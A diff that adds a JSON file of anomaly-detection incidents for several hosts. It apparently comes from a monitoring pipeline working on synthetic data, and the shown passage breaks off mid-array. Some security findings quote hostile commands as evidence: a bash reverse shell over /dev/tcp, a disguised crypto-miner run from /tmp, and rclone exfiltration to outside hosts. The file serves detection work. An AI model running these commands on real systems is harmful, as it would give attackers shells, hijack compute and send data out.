@@ -1,0 +1,5345 @@
+[
+  {
+    "key":"db-01:data_exfiltration:20260114T0200",
+    "host":"db-01",
+    "role":"db",
+    "start":"2026-01-14T02:00:00+00:00",
+    "end":"2026-01-14T02:23:00+00:00",
+    "peak_score":3.9375,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder"
+    ],
+    "suspected_type":"data_exfiltration",
+    "category":"security",
+    "severity":"critical",
+    "top_metrics":[
+      {
+        "metric":"net_out_mbps",
+        "z":20.37
+      },
+      {
+        "metric":"cpu_pct",
+        "z":3.88
+      },
+      {
+        "metric":"latency_p95_ms",
+        "z":0.89
+      },
+      {
+        "metric":"disk_pct",
+        "z":-0.88
+      }
+    ],
+    "findings":[
+
+    ]
+  },
+  {
+    "key":"worker-01:latency_degradation:20260114T0848",
+    "host":"worker-01",
+    "role":"worker",
+    "start":"2026-01-14T08:48:00+00:00",
+    "end":"2026-01-14T08:49:00+00:00",
+    "peak_score":1.0628,
+    "detectors":[
+      "lstm_autoencoder"
+    ],
+    "suspected_type":"latency_degradation",
+    "category":"operational",
+    "severity":"medium",
+    "top_metrics":[
+      {
+        "metric":"net_in_mbps",
+        "z":1.54
+      },
+      {
+        "metric":"disk_pct",
+        "z":-1.49
+      },
+      {
+        "metric":"error_rate_pct",
+        "z":1.06
+      },
+      {
+        "metric":"process_count",
+        "z":1.01
+      }
+    ],
+    "findings":[
+
+    ]
+  },
+  {
+    "key":"worker-01:memory_leak:20260114T1005",
+    "host":"worker-01",
+    "role":"worker",
+    "start":"2026-01-14T10:05:00+00:00",
+    "end":"2026-01-14T10:08:00+00:00",
+    "peak_score":1.0965,
+    "detectors":[
+
+    ],
+    "suspected_type":"memory_leak",
+    "category":"operational",
+    "severity":"high",
+    "top_metrics":[
+      {
+        "metric":"mem_pct",
+        "z":5.61
+      },
+      {
+        "metric":"disk_pct",
+        "z":-1.19
+      },
+      {
+        "metric":"cpu_pct",
+        "z":0.73
+      },
+      {
+        "metric":"process_count",
+        "z":0.67
+      }
+    ],
+    "findings":[
+
+    ]
+  },
+  {
+    "key":"worker-01:memory_leak:20260114T1019",
+    "host":"worker-01",
+    "role":"worker",
+    "start":"2026-01-14T10:19:00+00:00",
+    "end":"2026-01-14T12:02:00+00:00",
+    "peak_score":6.6726,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder"
+    ],
+    "suspected_type":"memory_leak",
+    "category":"operational",
+    "severity":"critical",
+    "top_metrics":[
+      {
+        "metric":"mem_pct",
+        "z":17.22
+      },
+      {
+        "metric":"latency_p95_ms",
+        "z":2.85
+      },
+      {
+        "metric":"error_rate_pct",
+        "z":1.94
+      },
+      {
+        "metric":"cpu_pct",
+        "z":1.25
+      }
+    ],
+    "findings":[
+
+    ]
+  },
+  {
+    "key":"db-01:latency_degradation:20260114T1059",
+    "host":"db-01",
+    "role":"db",
+    "start":"2026-01-14T10:59:00+00:00",
+    "end":"2026-01-14T11:00:00+00:00",
+    "peak_score":1.0498,
+    "detectors":[
+      "lstm_autoencoder"
+    ],
+    "suspected_type":"latency_degradation",
+    "category":"operational",
+    "severity":"medium",
+    "top_metrics":[
+      {
+        "metric":"cpu_pct",
+        "z":2.17
+      },
+      {
+        "metric":"disk_pct",
+        "z":-1.05
+      },
+      {
+        "metric":"mem_pct",
+        "z":-0.69
+      },
+      {
+        "metric":"latency_p95_ms",
+        "z":0.65
+      }
+    ],
+    "findings":[
+
+    ]
+  },
+  {
+    "key":"web-01:memory_leak:20260114T1253",
+    "host":"web-01",
+    "role":"web",
+    "start":"2026-01-14T12:53:00+00:00",
+    "end":"2026-01-14T14:04:00+00:00",
+    "peak_score":7.652,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder"
+    ],
+    "suspected_type":"memory_leak",
+    "category":"operational",
+    "severity":"critical",
+    "top_metrics":[
+      {
+        "metric":"mem_pct",
+        "z":17.74
+      },
+      {
+        "metric":"error_rate_pct",
+        "z":4.82
+      },
+      {
+        "metric":"latency_p95_ms",
+        "z":4.23
+      },
+      {
+        "metric":"cpu_pct",
+        "z":0.95
+      }
+    ],
+    "findings":[
+
+    ]
+  },
+  {
+    "key":"api-01:suspicious_process:20260114T1355",
+    "host":"api-01",
+    "role":"api",
+    "start":"2026-01-14T13:55:00+00:00",
+    "end":"2026-01-14T14:17:00+00:00",
+    "peak_score":2.4164,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder",
+      "security_rules"
+    ],
+    "suspected_type":"suspicious_process",
+    "category":"security",
+    "severity":"critical",
+    "top_metrics":[
+      {
+        "metric":"cpu_pct",
+        "z":7.46
+      },
+      {
+        "metric":"latency_p95_ms",
+        "z":2.21
+      },
+      {
+        "metric":"requests_per_sec",
+        "z":1.31
+      },
+      {
+        "metric":"disk_pct",
+        "z":-1.22
+      }
+    ],
+    "findings":[
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-14T13:55:15.681828+00:00",
+        "rule_id":"PROC-001",
+        "incident_type":"suspicious_process",
+        "severity":"high",
+        "description":"Crypto-mining pool connection",
+        "evidence":"type=EXECVE uid=www-data cmd=\"\/tmp\/.cache\/kworkerds --url stratum+tcp:\/\/pool.mining.example:3333 --threads 8\"",
+        "source_ip":null
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-14T13:55:15.681828+00:00",
+        "rule_id":"PROC-002",
+        "incident_type":"suspicious_process",
+        "severity":"critical",
+        "description":"Execution from \/tmp or reverse shell",
+        "evidence":"type=EXECVE uid=www-data cmd=\"\/tmp\/.cache\/kworkerds --url stratum+tcp:\/\/pool.mining.example:3333 --threads 8\"",
+        "source_ip":null
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-14T13:56:11.784232+00:00",
+        "rule_id":"PROC-001",
+        "incident_type":"suspicious_process",
+        "severity":"high",
+        "description":"Crypto-mining pool connection",
+        "evidence":"ESTABLISHED 10.0.1.12:52848 -> 198.51.100.231:3333 proto=tcp process=kworkerds",
+        "source_ip":null
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-14T13:56:41.321832+00:00",
+        "rule_id":"PROC-001",
+        "incident_type":"suspicious_process",
+        "severity":"high",
+        "description":"Crypto-mining pool connection",
+        "evidence":"type=EXECVE uid=www-data cmd=\"\/tmp\/.cache\/kworkerds --url stratum+tcp:\/\/pool.mining.example:3333 --threads 8\"",
+        "source_ip":null
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-14T13:56:41.321832+00:00",
+        "rule_id":"PROC-002",
+        "incident_type":"suspicious_process",
+        "severity":"critical",
+        "description":"Execution from \/tmp or reverse shell",
+        "evidence":"type=EXECVE uid=www-data cmd=\"\/tmp\/.cache\/kworkerds --url stratum+tcp:\/\/pool.mining.example:3333 --threads 8\"",
+        "source_ip":null
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-14T13:57:01.094988+00:00",
+        "rule_id":"PROC-001",
+        "incident_type":"suspicious_process",
+        "severity":"high",
+        "description":"Crypto-mining pool connection",
+        "evidence":"ESTABLISHED 10.0.1.12:54069 -> 198.51.100.231:3333 proto=tcp process=kworkerds",
+        "source_ip":null
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-14T13:57:14.879328+00:00",
+        "rule_id":"PROC-001",
+        "incident_type":"suspicious_process",
+        "severity":"high",
+        "description":"Crypto-mining pool connection",
+        "evidence":"type=EXECVE uid=www-data cmd=\"\/tmp\/.cache\/kworkerds --url stratum+tcp:\/\/pool.mining.example:3333 --threads 8\"",
+        "source_ip":null
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-14T13:57:14.879328+00:00",
+        "rule_id":"PROC-002",
+        "incident_type":"suspicious_process",
+        "severity":"critical",
+        "description":"Execution from \/tmp or reverse shell",
+        "evidence":"type=EXECVE uid=www-data cmd=\"\/tmp\/.cache\/kworkerds --url stratum+tcp:\/\/pool.mining.example:3333 --threads 8\"",
+        "source_ip":null
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-14T13:59:59.368439+00:00",
+        "rule_id":"PROC-002",
+        "incident_type":"suspicious_process",
+        "severity":"critical",
+        "description":"Execution from \/tmp or reverse shell",
+        "evidence":"type=EXECVE uid=www-data cmd=\"bash -i >& \/dev\/tcp\/198.51.100.231\/4444 0>&1\"",
+        "source_ip":"198.51.100.231"
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-14T14:02:03.817185+00:00",
+        "rule_id":"PROC-001",
+        "incident_type":"suspicious_process",
+        "severity":"high",
+        "description":"Crypto-mining pool connection",
+        "evidence":"ESTABLISHED 10.0.1.12:56508 -> 198.51.100.231:3333 proto=tcp process=kworkerds",
+        "source_ip":null
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-14T14:05:32.300569+00:00",
+        "rule_id":"PROC-002",
+        "incident_type":"suspicious_process",
+        "severity":"critical",
+        "description":"Execution from \/tmp or reverse shell",
+        "evidence":"type=EXECVE uid=www-data cmd=\"bash -i >& \/dev\/tcp\/198.51.100.231\/4444 0>&1\"",
+        "source_ip":"198.51.100.231"
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-14T14:06:25.939545+00:00",
+        "rule_id":"PROC-001",
+        "incident_type":"suspicious_process",
+        "severity":"high",
+        "description":"Crypto-mining pool connection",
+        "evidence":"ESTABLISHED 10.0.1.12:53250 -> 198.51.100.231:3333 proto=tcp process=kworkerds",
+        "source_ip":null
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-14T14:11:58.199026+00:00",
+        "rule_id":"PROC-001",
+        "incident_type":"suspicious_process",
+        "severity":"high",
+        "description":"Crypto-mining pool connection",
+        "evidence":"ESTABLISHED 10.0.1.12:51526 -> 198.51.100.231:3333 proto=tcp process=kworkerds",
+        "source_ip":null
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-14T14:13:31.463367+00:00",
+        "rule_id":"PROC-001",
+        "incident_type":"suspicious_process",
+        "severity":"high",
+        "description":"Crypto-mining pool connection",
+        "evidence":"ESTABLISHED 10.0.1.12:44040 -> 198.51.100.231:3333 proto=tcp process=kworkerds",
+        "source_ip":null
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-14T14:14:38.666994+00:00",
+        "rule_id":"PROC-001",
+        "incident_type":"suspicious_process",
+        "severity":"high",
+        "description":"Crypto-mining pool connection",
+        "evidence":"ESTABLISHED 10.0.1.12:41884 -> 198.51.100.231:3333 proto=tcp process=kworkerds",
+        "source_ip":null
+      }
+    ]
+  },
+  {
+    "key":"web-01:disk_fill:20260114T1517",
+    "host":"web-01",
+    "role":"web",
+    "start":"2026-01-14T15:17:00+00:00",
+    "end":"2026-01-14T17:38:00+00:00",
+    "peak_score":7.2718,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder"
+    ],
+    "suspected_type":"disk_fill",
+    "category":"operational",
+    "severity":"critical",
+    "top_metrics":[
+      {
+        "metric":"disk_pct",
+        "z":33.84
+      },
+      {
+        "metric":"error_rate_pct",
+        "z":3.73
+      },
+      {
+        "metric":"latency_p95_ms",
+        "z":0.88
+      },
+      {
+        "metric":"net_in_mbps",
+        "z":0.8
+      }
+    ],
+    "findings":[
+
+    ]
+  },
+  {
+    "key":"api-02:latency_degradation:20260114T1532",
+    "host":"api-02",
+    "role":"api",
+    "start":"2026-01-14T15:32:00+00:00",
+    "end":"2026-01-14T15:36:00+00:00",
+    "peak_score":1.4018,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder"
+    ],
+    "suspected_type":"latency_degradation",
+    "category":"operational",
+    "severity":"medium",
+    "top_metrics":[
+      {
+        "metric":"latency_p95_ms",
+        "z":4.16
+      },
+      {
+        "metric":"net_in_mbps",
+        "z":2.68
+      },
+      {
+        "metric":"cpu_pct",
+        "z":1.7
+      },
+      {
+        "metric":"process_count",
+        "z":1.35
+      }
+    ],
+    "findings":[
+
+    ]
+  },
+  {
+    "key":"web-02:latency_degradation:20260114T1532",
+    "host":"web-02",
+    "role":"web",
+    "start":"2026-01-14T15:32:00+00:00",
+    "end":"2026-01-14T15:35:00+00:00",
+    "peak_score":1.2472,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder"
+    ],
+    "suspected_type":"latency_degradation",
+    "category":"operational",
+    "severity":"medium",
+    "top_metrics":[
+      {
+        "metric":"latency_p95_ms",
+        "z":3.24
+      },
+      {
+        "metric":"cpu_pct",
+        "z":2.43
+      },
+      {
+        "metric":"error_rate_pct",
+        "z":2.38
+      },
+      {
+        "metric":"net_in_mbps",
+        "z":-1.18
+      }
+    ],
+    "findings":[
+
+    ]
+  },
+  {
+    "key":"web-01:suspicious_process:20260114T1828",
+    "host":"web-01",
+    "role":"web",
+    "start":"2026-01-14T18:28:00+00:00",
+    "end":"2026-01-14T18:56:00+00:00",
+    "peak_score":4.1112,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder",
+      "security_rules"
+    ],
+    "suspected_type":"suspicious_process",
+    "category":"security",
+    "severity":"critical",
+    "top_metrics":[
+      {
+        "metric":"cpu_pct",
+        "z":12.37
+      },
+      {
+        "metric":"latency_p95_ms",
+        "z":5.52
+      },
+      {
+        "metric":"process_count",
+        "z":1.32
+      },
+      {
+        "metric":"disk_pct",
+        "z":-1.05
+      }
+    ],
+    "findings":[
+      {
+        "host":"web-01",
+        "timestamp":"2026-01-14T18:28:45.648349+00:00",
+        "rule_id":"PROC-001",
+        "incident_type":"suspicious_process",
+        "severity":"high",
+        "description":"Crypto-mining pool connection",
+        "evidence":"type=EXECVE uid=www-data cmd=\"\/tmp\/.cache\/kworkerds --url stratum+tcp:\/\/pool.mining.example:3333 --threads 8\"",
+        "source_ip":null
+      },
+      {
+        "host":"web-01",
+        "timestamp":"2026-01-14T18:28:45.648349+00:00",
+        "rule_id":"PROC-002",
+        "incident_type":"suspicious_process",
+        "severity":"critical",
+        "description":"Execution from \/tmp or reverse shell",
+        "evidence":"type=EXECVE uid=www-data cmd=\"\/tmp\/.cache\/kworkerds --url stratum+tcp:\/\/pool.mining.example:3333 --threads 8\"",
+        "source_ip":null
+      },
+      {
+        "host":"web-01",
+        "timestamp":"2026-01-14T18:28:57.645376+00:00",
+        "rule_id":"PROC-001",
+        "incident_type":"suspicious_process",
+        "severity":"high",
+        "description":"Crypto-mining pool connection",
+        "evidence":"ESTABLISHED 10.0.1.10:47572 -> 192.0.2.185:3333 proto=tcp process=kworkerds",
+        "source_ip":null
+      },
+      {
+        "host":"web-01",
+        "timestamp":"2026-01-14T18:29:40.268722+00:00",
+        "rule_id":"PROC-001",
+        "incident_type":"suspicious_process",
+        "severity":"high",
+        "description":"Crypto-mining pool connection",
+        "evidence":"type=EXECVE uid=www-data cmd=\"\/tmp\/.cache\/kworkerds --url stratum+tcp:\/\/pool.mining.example:3333 --threads 8\"",
+        "source_ip":null
+      },
+      {
+        "host":"web-01",
+        "timestamp":"2026-01-14T18:29:40.268722+00:00",
+        "rule_id":"PROC-002",
+        "incident_type":"suspicious_process",
+        "severity":"critical",
+        "description":"Execution from \/tmp or reverse shell",
+        "evidence":"type=EXECVE uid=www-data cmd=\"\/tmp\/.cache\/kworkerds --url stratum+tcp:\/\/pool.mining.example:3333 --threads 8\"",
+        "source_ip":null
+      },
+      {
+        "host":"web-01",
+        "timestamp":"2026-01-14T18:30:47.215146+00:00",
+        "rule_id":"PROC-002",
+        "incident_type":"suspicious_process",
+        "severity":"critical",
+        "description":"Execution from \/tmp or reverse shell",
+        "evidence":"type=EXECVE uid=www-data cmd=\"bash -i >& \/dev\/tcp\/192.0.2.185\/4444 0>&1\"",
+        "source_ip":"192.0.2.185"
+      },
+      {
+        "host":"web-01",
+        "timestamp":"2026-01-14T18:30:59.981042+00:00",
+        "rule_id":"PROC-001",
+        "incident_type":"suspicious_process",
+        "severity":"high",
+        "description":"Crypto-mining pool connection",
+        "evidence":"type=EXECVE uid=www-data cmd=\"\/tmp\/.cache\/kworkerds --url stratum+tcp:\/\/pool.mining.example:3333 --threads 8\"",
+        "source_ip":null
+      },
+      {
+        "host":"web-01",
+        "timestamp":"2026-01-14T18:30:59.981042+00:00",
+        "rule_id":"PROC-002",
+        "incident_type":"suspicious_process",
+        "severity":"critical",
+        "description":"Execution from \/tmp or reverse shell",
+        "evidence":"type=EXECVE uid=www-data cmd=\"\/tmp\/.cache\/kworkerds --url stratum+tcp:\/\/pool.mining.example:3333 --threads 8\"",
+        "source_ip":null
+      },
+      {
+        "host":"web-01",
+        "timestamp":"2026-01-14T18:32:49.014147+00:00",
+        "rule_id":"PROC-001",
+        "incident_type":"suspicious_process",
+        "severity":"high",
+        "description":"Crypto-mining pool connection",
+        "evidence":"ESTABLISHED 10.0.1.10:42917 -> 192.0.2.185:3333 proto=tcp process=kworkerds",
+        "source_ip":null
+      },
+      {
+        "host":"web-01",
+        "timestamp":"2026-01-14T18:35:54.405305+00:00",
+        "rule_id":"PROC-001",
+        "incident_type":"suspicious_process",
+        "severity":"high",
+        "description":"Crypto-mining pool connection",
+        "evidence":"ESTABLISHED 10.0.1.10:43203 -> 192.0.2.185:3333 proto=tcp process=kworkerds",
+        "source_ip":null
+      },
+      {
+        "host":"web-01",
+        "timestamp":"2026-01-14T18:36:16.495285+00:00",
+        "rule_id":"PROC-001",
+        "incident_type":"suspicious_process",
+        "severity":"high",
+        "description":"Crypto-mining pool connection",
+        "evidence":"ESTABLISHED 10.0.1.10:42380 -> 192.0.2.185:3333 proto=tcp process=kworkerds",
+        "source_ip":null
+      },
+      {
+        "host":"web-01",
+        "timestamp":"2026-01-14T18:38:01.056647+00:00",
+        "rule_id":"PROC-001",
+        "incident_type":"suspicious_process",
+        "severity":"high",
+        "description":"Crypto-mining pool connection",
+        "evidence":"ESTABLISHED 10.0.1.10:51071 -> 192.0.2.185:3333 proto=tcp process=kworkerds",
+        "source_ip":null
+      },
+      {
+        "host":"web-01",
+        "timestamp":"2026-01-14T18:39:32.167576+00:00",
+        "rule_id":"PROC-001",
+        "incident_type":"suspicious_process",
+        "severity":"high",
+        "description":"Crypto-mining pool connection",
+        "evidence":"ESTABLISHED 10.0.1.10:57875 -> 192.0.2.185:3333 proto=tcp process=kworkerds",
+        "source_ip":null
+      },
+      {
+        "host":"web-01",
+        "timestamp":"2026-01-14T18:40:38.968247+00:00",
+        "rule_id":"PROC-001",
+        "incident_type":"suspicious_process",
+        "severity":"high",
+        "description":"Crypto-mining pool connection",
+        "evidence":"ESTABLISHED 10.0.1.10:54140 -> 192.0.2.185:3333 proto=tcp process=kworkerds",
+        "source_ip":null
+      },
+      {
+        "host":"web-01",
+        "timestamp":"2026-01-14T18:41:58.721513+00:00",
+        "rule_id":"PROC-001",
+        "incident_type":"suspicious_process",
+        "severity":"high",
+        "description":"Crypto-mining pool connection",
+        "evidence":"ESTABLISHED 10.0.1.10:42786 -> 192.0.2.185:3333 proto=tcp process=kworkerds",
+        "source_ip":null
+      },
+      {
+        "host":"web-01",
+        "timestamp":"2026-01-14T18:42:48.892760+00:00",
+        "rule_id":"PROC-002",
+        "incident_type":"suspicious_process",
+        "severity":"critical",
+        "description":"Execution from \/tmp or reverse shell",
+        "evidence":"type=EXECVE uid=www-data cmd=\"bash -i >& \/dev\/tcp\/192.0.2.185\/4444 0>&1\"",
+        "source_ip":"192.0.2.185"
+      },
+      {
+        "host":"web-01",
+        "timestamp":"2026-01-14T18:42:58.492408+00:00",
+        "rule_id":"PROC-001",
+        "incident_type":"suspicious_process",
+        "severity":"high",
+        "description":"Crypto-mining pool connection",
+        "evidence":"ESTABLISHED 10.0.1.10:42955 -> 192.0.2.185:3333 proto=tcp process=kworkerds",
+        "source_ip":null
+      },
+      {
+        "host":"web-01",
+        "timestamp":"2026-01-14T18:43:00.038117+00:00",
+        "rule_id":"PROC-001",
+        "incident_type":"suspicious_process",
+        "severity":"high",
+        "description":"Crypto-mining pool connection",
+        "evidence":"ESTABLISHED 10.0.1.10:41914 -> 192.0.2.185:3333 proto=tcp process=kworkerds",
+        "source_ip":null
+      },
+      {
+        "host":"web-01",
+        "timestamp":"2026-01-14T18:45:15.727306+00:00",
+        "rule_id":"PROC-001",
+        "incident_type":"suspicious_process",
+        "severity":"high",
+        "description":"Crypto-mining pool connection",
+        "evidence":"ESTABLISHED 10.0.1.10:41361 -> 192.0.2.185:3333 proto=tcp process=kworkerds",
+        "source_ip":null
+      },
+      {
+        "host":"web-01",
+        "timestamp":"2026-01-14T18:48:40.477516+00:00",
+        "rule_id":"PROC-001",
+        "incident_type":"suspicious_process",
+        "severity":"high",
+        "description":"Crypto-mining pool connection",
+        "evidence":"ESTABLISHED 10.0.1.10:44342 -> 192.0.2.185:3333 proto=tcp process=kworkerds",
+        "source_ip":null
+      }
+    ]
+  },
+  {
+    "key":"db-01:suspicious_process:20260114T1933",
+    "host":"db-01",
+    "role":"db",
+    "start":"2026-01-14T19:33:00+00:00",
+    "end":"2026-01-14T19:51:00+00:00",
+    "peak_score":3.6329,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder"
+    ],
+    "suspected_type":"suspicious_process",
+    "category":"security",
+    "severity":"critical",
+    "top_metrics":[
+      {
+        "metric":"cpu_pct",
+        "z":15.22
+      },
+      {
+        "metric":"latency_p95_ms",
+        "z":2.52
+      },
+      {
+        "metric":"net_in_mbps",
+        "z":1.43
+      },
+      {
+        "metric":"disk_pct",
+        "z":-1.15
+      }
+    ],
+    "findings":[
+
+    ]
+  },
+  {
+    "key":"worker-01:suspicious_process:20260114T2108",
+    "host":"worker-01",
+    "role":"worker",
+    "start":"2026-01-14T21:08:00+00:00",
+    "end":"2026-01-14T21:30:00+00:00",
+    "peak_score":2.6672,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder",
+      "security_rules"
+    ],
+    "suspected_type":"suspicious_process",
+    "category":"security",
+    "severity":"critical",
+    "top_metrics":[
+      {
+        "metric":"cpu_pct",
+        "z":8.09
+      },
+      {
+        "metric":"latency_p95_ms",
+        "z":4.63
+      },
+      {
+        "metric":"net_out_mbps",
+        "z":1.34
+      },
+      {
+        "metric":"process_count",
+        "z":0.95
+      }
+    ],
+    "findings":[
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-14T21:08:03.822547+00:00",
+        "rule_id":"PROC-001",
+        "incident_type":"suspicious_process",
+        "severity":"high",
+        "description":"Crypto-mining pool connection",
+        "evidence":"ESTABLISHED 10.0.1.15:51327 -> 192.0.2.15:3333 proto=tcp process=kworkerds",
+        "source_ip":null
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-14T21:11:28.203041+00:00",
+        "rule_id":"PROC-001",
+        "incident_type":"suspicious_process",
+        "severity":"high",
+        "description":"Crypto-mining pool connection",
+        "evidence":"ESTABLISHED 10.0.1.15:57014 -> 192.0.2.15:3333 proto=tcp process=kworkerds",
+        "source_ip":null
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-14T21:12:48.973952+00:00",
+        "rule_id":"PROC-001",
+        "incident_type":"suspicious_process",
+        "severity":"high",
+        "description":"Crypto-mining pool connection",
+        "evidence":"ESTABLISHED 10.0.1.15:40018 -> 192.0.2.15:3333 proto=tcp process=kworkerds",
+        "source_ip":null
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-14T21:13:00.903621+00:00",
+        "rule_id":"PROC-001",
+        "incident_type":"suspicious_process",
+        "severity":"high",
+        "description":"Crypto-mining pool connection",
+        "evidence":"ESTABLISHED 10.0.1.15:48603 -> 192.0.2.15:3333 proto=tcp process=kworkerds",
+        "source_ip":null
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-14T21:17:06.788477+00:00",
+        "rule_id":"PROC-002",
+        "incident_type":"suspicious_process",
+        "severity":"critical",
+        "description":"Execution from \/tmp or reverse shell",
+        "evidence":"type=EXECVE uid=www-data cmd=\"bash -i >& \/dev\/tcp\/192.0.2.15\/4444 0>&1\"",
+        "source_ip":"192.0.2.15"
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-14T21:20:59.647093+00:00",
+        "rule_id":"PROC-001",
+        "incident_type":"suspicious_process",
+        "severity":"high",
+        "description":"Crypto-mining pool connection",
+        "evidence":"ESTABLISHED 10.0.1.15:49890 -> 192.0.2.15:3333 proto=tcp process=kworkerds",
+        "source_ip":null
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-14T21:21:24.839383+00:00",
+        "rule_id":"PROC-001",
+        "incident_type":"suspicious_process",
+        "severity":"high",
+        "description":"Crypto-mining pool connection",
+        "evidence":"ESTABLISHED 10.0.1.15:48482 -> 192.0.2.15:3333 proto=tcp process=kworkerds",
+        "source_ip":null
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-14T21:24:56.768743+00:00",
+        "rule_id":"PROC-001",
+        "incident_type":"suspicious_process",
+        "severity":"high",
+        "description":"Crypto-mining pool connection",
+        "evidence":"ESTABLISHED 10.0.1.15:46112 -> 192.0.2.15:3333 proto=tcp process=kworkerds",
+        "source_ip":null
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-14T21:27:49.441885+00:00",
+        "rule_id":"PROC-001",
+        "incident_type":"suspicious_process",
+        "severity":"high",
+        "description":"Crypto-mining pool connection",
+        "evidence":"ESTABLISHED 10.0.1.15:43203 -> 192.0.2.15:3333 proto=tcp process=kworkerds",
+        "source_ip":null
+      }
+    ]
+  },
+  {
+    "key":"web-01:disk_fill:20260114T2321",
+    "host":"web-01",
+    "role":"web",
+    "start":"2026-01-14T23:21:00+00:00",
+    "end":"2026-01-15T01:33:00+00:00",
+    "peak_score":7.2811,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder"
+    ],
+    "suspected_type":"disk_fill",
+    "category":"operational",
+    "severity":"critical",
+    "top_metrics":[
+      {
+        "metric":"disk_pct",
+        "z":34.03
+      },
+      {
+        "metric":"error_rate_pct",
+        "z":3.03
+      },
+      {
+        "metric":"cpu_pct",
+        "z":0.35
+      },
+      {
+        "metric":"mem_pct",
+        "z":0.22
+      }
+    ],
+    "findings":[
+
+    ]
+  },
+  {
+    "key":"web-02:disk_fill:20260114T2335",
+    "host":"web-02",
+    "role":"web",
+    "start":"2026-01-14T23:35:00+00:00",
+    "end":"2026-01-15T01:41:00+00:00",
+    "peak_score":7.3258,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder"
+    ],
+    "suspected_type":"disk_fill",
+    "category":"operational",
+    "severity":"critical",
+    "top_metrics":[
+      {
+        "metric":"disk_pct",
+        "z":35.05
+      },
+      {
+        "metric":"error_rate_pct",
+        "z":3.12
+      },
+      {
+        "metric":"net_out_mbps",
+        "z":0.37
+      },
+      {
+        "metric":"requests_per_sec",
+        "z":0.33
+      }
+    ],
+    "findings":[
+
+    ]
+  },
+  {
+    "key":"worker-01:error_burst:20260115T0104",
+    "host":"worker-01",
+    "role":"worker",
+    "start":"2026-01-15T01:04:00+00:00",
+    "end":"2026-01-15T01:14:00+00:00",
+    "peak_score":5.9383,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder"
+    ],
+    "suspected_type":"error_burst",
+    "category":"operational",
+    "severity":"critical",
+    "top_metrics":[
+      {
+        "metric":"error_rate_pct",
+        "z":40.31
+      },
+      {
+        "metric":"latency_p95_ms",
+        "z":3.98
+      },
+      {
+        "metric":"process_count",
+        "z":-1.05
+      },
+      {
+        "metric":"cpu_pct",
+        "z":0.59
+      }
+    ],
+    "findings":[
+
+    ]
+  },
+  {
+    "key":"db-01:data_exfiltration:20260115T0200",
+    "host":"db-01",
+    "role":"db",
+    "start":"2026-01-15T02:00:00+00:00",
+    "end":"2026-01-15T02:23:00+00:00",
+    "peak_score":3.9406,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder"
+    ],
+    "suspected_type":"data_exfiltration",
+    "category":"security",
+    "severity":"critical",
+    "top_metrics":[
+      {
+        "metric":"net_out_mbps",
+        "z":20.39
+      },
+      {
+        "metric":"cpu_pct",
+        "z":3.22
+      },
+      {
+        "metric":"disk_pct",
+        "z":-0.9
+      },
+      {
+        "metric":"latency_p95_ms",
+        "z":0.87
+      }
+    ],
+    "findings":[
+
+    ]
+  },
+  {
+    "key":"worker-01:data_exfiltration:20260115T0254",
+    "host":"worker-01",
+    "role":"worker",
+    "start":"2026-01-15T02:54:00+00:00",
+    "end":"2026-01-15T03:34:00+00:00",
+    "peak_score":5.6915,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder",
+      "security_rules"
+    ],
+    "suspected_type":"data_exfiltration",
+    "category":"security",
+    "severity":"critical",
+    "top_metrics":[
+      {
+        "metric":"net_out_mbps",
+        "z":44.89
+      },
+      {
+        "metric":"cpu_pct",
+        "z":1.12
+      },
+      {
+        "metric":"error_rate_pct",
+        "z":0.82
+      },
+      {
+        "metric":"disk_pct",
+        "z":-0.62
+      }
+    ],
+    "findings":[
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-15T02:54:14.321332+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1592 MB sent to external 198.51.100.252:4444",
+        "evidence":"ESTABLISHED 10.0.1.15:51118 -> 198.51.100.252:4444 proto=tcp bytes_out=1592000000 process=rclone",
+        "source_ip":"198.51.100.252"
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-15T02:54:39.218736+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"2073 MB sent to external 198.51.100.252:8443",
+        "evidence":"ESTABLISHED 10.0.1.15:51789 -> 198.51.100.252:8443 proto=tcp bytes_out=2073000000 process=rclone",
+        "source_ip":"198.51.100.252"
+      },
+      {
